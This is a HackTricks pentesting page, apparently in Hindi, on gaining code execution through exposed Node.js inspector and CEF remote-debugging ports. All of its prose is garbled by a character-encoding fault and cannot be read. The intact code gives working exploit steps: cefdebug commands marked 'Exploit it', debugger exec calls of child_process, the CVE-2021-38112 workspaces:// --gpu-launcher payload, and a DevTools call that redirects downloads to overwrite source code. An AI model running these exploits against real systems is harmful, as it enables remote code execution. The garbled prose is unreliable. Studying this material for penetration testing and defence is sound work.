# рдиреЛрдб рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░/CEF рдбреАрдмрдЧ рджреБрд░реБрдкрдпреЛрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

рдЬрдм `--inspect` рд╕реНрд╡рд┐рдЪ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдиреЛрдб.рдЬреЗрдПрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдбреАрдмрдЧрд┐рдВрдЧ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд╕реБрдирддреА рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рдореЗрдВ, рдпрд╣ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ **`127.0.0.1:9229`** рдкрд░ рд╕реБрдиреЗрдЧрд╛ред рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ **рдЕрджреНрд╡рд┐рддреАрдп** **UUID** рднреА рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рд╣реЛрд╕реНрдЯ рдкрддрд╛, рдкреЛрд░реНрдЯ, рдФрд░ UUID рдХреЛ рдЬрд╛рдирдирд╛ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВред рдкреВрд░реНрдг URL рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛ `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`ред

{% hint style="warning" %}
рдХреНрдпреЛрдВрдХрд┐ **рдбреАрдмрдЧрд░ рдХреЛ рдиреЛрдб.рдЬреЗрдПрд╕ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдкрд░реНрдпрд╛рд╡рд░рдг рдХрд╛ рдкреВрд░рд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ**, рдЗрд╕ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрд╛рд░рдХ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдиреЛрдб.рдЬреЗрдПрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдирд╛рдорд╛рдВрдХрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ (**рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди**)
{% endhint %}

рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
рдЬрдм рдЖрдк рдПрдХ рдирд┐рд░реАрдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рджрд┐рдЦреЗрдЧрд╛:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
рдЪреНрд░реЛрдорд┐рдпрдо рдПрдореНрдмреЗрдбреЗрдб рдлреНрд░реЗрдорд╡рд░реНрдХ (CEF) рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `--remote-debugging-port=9222` рдЬреИрд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ **рдбреАрдмрдЧрд░** (SSRF рд╕рдВрд░рдХреНрд╖рдг рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд░рд╣рддреА рд╣реИ) рдЦреЛрд▓ рд╕рдХреЗрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдиреЛрдбрдЬреЗрдПрд╕ рдбреАрдмрдЧ рд╕рддреНрд░ рдХреА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп, рд╡реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд╕рд╛рде [рдХреНрд░реЛрдо рдбреЗрд╡рдЯреВрд▓реНрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓](https://chromedevtools.github.io/devtools-protocol/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрдЪрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдпрд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╣реИ, рд▓реЗрдХрд┐рди рд╕реАрдзрд╛ RCE рдирд╣реАрдВ рд╣реИред

рдЬрдм рдЖрдк рдПрдХ рдбреАрдмрдЧ рдХрд┐рдП рдЧрдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рджрд┐рдЦреЗрдЧрд╛:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### рдмреНрд░рд╛рдЙрдЬрд╝рд░, рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдФрд░ рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐ <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

рд╡реЗрдм-рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдЦреБрд▓реА рд╡реЗрдмрд╕рд╛рдЗрдЯреЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбрд▓ рдХреЗ рддрд╣рдд рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдФрд░ HTTP рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреА рд╣реИрдВред **рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ HTTP рдХрдиреЗрдХреНрд╢рди** рдХреЛ **рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдбреАрдмрдЧрд░ рд╕рддреНрд░ рдЖрдИрдбреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред **рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐** рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдЗрд╕ HTTP рдХрдиреЗрдХреНрд╢рди рдХреЛ рдмрдирд╛рдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИред [**DNS рд░рд┐рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╣рдорд▓реЛрдВ**](https://en.wikipedia.org/wiki/DNS\_rebinding) рдХреЗ рдЦрд┐рд▓рд╛рдл рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП, Node.js рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП **'Host' рд╣реИрдбрд░** рдпрд╛ рддреЛ **рдПрдХ рдЖрдИрдкреА тАЛтАЛрдкрддрд╛** рдпрд╛ рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ **`localhost`** рдпрд╛ **`localhost6`** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред

{% hint style="info" %}
рдпрд╣ **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рдХрд╛ рд╢реЛрдзрд╛рд░реНрдереА рдЙрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреЗрд╡рд▓ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░** (рдЬреЛ рдПрдХ SSRF рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ рдХрд░рдирд╛

рдЖрдк рдПрдХ рдЪрд▓ рд░рд╣реЗ рдиреЛрдбрдЬреЗрдПрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рд╕рд┐рдЧреНрдирд▓ SIGUSR1** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЗрд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ рдореЗрдВ рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╢реБрд░реВ** рдХрд░реЗрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЖрдкрдХреЛ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рднреАрддрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкрд╣реБрдВрдЪ** рджреЗ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдирд╣реАрдВред
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
рдпрд╣ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрдВрдж рдХрд░рдХреЗ рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рдирд╛** `--inspect` рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдХрдВрдЯреЗрдирд░** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде **рдорд░ рдЬрд╛рдПрдЧрд╛**ред
{% endhint %}

### рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░/рдбреАрдмрдЧрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **Chromium рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░** рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк `chrome://inspect` рдпрд╛ `edge://inspect` рдореЗрдВ рдЬрд╛рдХрд░ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдХрд╛ **рд▓рдХреНрд╖рд┐рдд рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ** рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВ (рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд┐рддреНрд░ рдореЗрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдПрдХ рдЕрдЧрд▓реЗ рдЦрдВрдб рдХреЗ рдЙрджрд╛рд╣рд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдХреИрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдХрд╛ рдкрддрд╛ рдЪрд▓реЗрдЧрд╛)ред

![](<../../.gitbook/assets/image (620) (1).png>)

**рдХрдорд╛рдВрдб рд▓рд╛рдЗрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдбреАрдмрдЧрд░/рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
рдпрд╣ рдЯреВрд▓ [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓ рд░рд╣реЗ **рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░реНрд╕ рдХреЛ рдЦреЛрдЬрдиреЗ** рдФрд░ рдЙрдирдореЗрдВ **рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реИрдВ, рддреЛ **NodeJS RCE рдЙрддреНрдкрдиреНрди рдирд╣реАрдВ рд╣реЛрдЧреА** (рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП API рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреА)ред
{% endhint %}

## NodeJS Debugger/Inspector рдореЗрдВ RCE

{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдЗрд▓реЗрдХреНрдЯреНрд░реЙрди рдореЗрдВ XSS рд╕реЗ [**RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкреГрд╖реНрда рджреЗрдЦрдиреЗ рдЖрдП рд╣реИрдВ рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

рдЬрдм рдЖрдк рдПрдХ рдиреЛрдб **рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **Chrome DevTools protocol рдХрдиреЗрдХреНрд╢рди рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

рдЖрдк рдпрд╣рд╛рдБ API рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
рдЗрд╕ рдЦрдВрдб рдореЗрдВ рдореИрдВ рдХреЗрд╡рд▓ рд╡рд╣ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реВрдВрдЧрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рд▓реЛрдЧреЛрдВ рдиреЗ рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИред

### рдЧрд╣рд░реЗ рд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) рдореЗрдВ Rhino рд╕реБрд░рдХреНрд╖рд╛ рдиреЗ рдЦреЛрдЬрд╛ рдХрд┐ CEF рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо URI (workspaces://) рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдерд╛ рдЬреЛ рдкреВрд░реА URI рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рдерд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕ URI рд╕реЗ рдЖрдВрд╢рд┐рдХ рд░реВрдк рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде CEF рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд╛рд▓реВ рдХрд░рддрд╛ рдерд╛ред

рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ URI рдкреИрд░рд╛рдореАрдЯрд░ URL рдбреАрдХреЛрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ CEF рдмреЗрд╕рд┐рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝реНрд▓реИрдЧ **`--gpu-launcher`** рдХреЛ **рдХрдорд╛рдВрдб рд▓рд╛рдЗрди** рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
рдХреИрд▓реНрдХ.exe рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВрдЧреЗред

### рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ

**рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЛ рдмрдЪрд╛рдиреЗ рд╡рд╛рд▓реЗ** рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдмрджрд▓реЗрдВ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЕрдкрдиреЗ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреЛрдб** рдХреЗ рд╕рд╛рде рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдХреНрд╕рд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рд╕реНрд░реЛрдд рдХреЛрдб** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░ рд╕рдХреЗрдВред
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE рдФрд░ рдмрд╛рд╣рд░реА рдирд┐рдХрд╛рд╕реА

рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) рдереЗрд░рд┐рд╡рд░ рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рдЖрдВрддрд░рд┐рдХ рдкреГрд╖реНрдареЛрдВ рдХреЛ рдмрд╛рд╣рд░реА рдирд┐рдХрд╛рд╕реА рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

